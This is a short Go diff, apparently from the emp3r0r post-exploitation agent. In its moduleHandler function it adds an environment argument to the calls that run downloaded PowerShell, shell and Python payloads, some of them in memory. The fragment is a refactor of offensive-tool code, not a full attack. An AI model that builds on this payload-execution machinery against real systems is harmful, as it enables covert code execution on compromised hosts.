@@ -60,7 +60,7 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
-		out, err := RunPSScript(payload_data)
+		out, err := RunPSScript(payload_data, env)
 		if err != nil {
 			return fmt.Sprintf("running powershell script: %s (%v)", out, err)
 		}
@@ -68,7 +68,7 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 	case "bash":
 		executable = emp3r0r_def.DefaultShell
 		log.Printf("shell executable: %s", executable)
-		out, err := RunShellScript(payload_data)
+		out, err := RunShellScript(payload_data, env)
 		if err != nil {
 			return fmt.Sprintf("running shell script: %s (%v)", out, err)
 		}
@@ -77,7 +77,7 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 		executable = "python"
 		args = []string{exec_cmd}
 		if inMem {
-			out, err := RunPythonScript(payload_data)
+			out, err := RunPythonScript(payload_data, env)
 			if err != nil {
 				return fmt.Sprintf("running python script: %s (%v)", out, err)
 			}
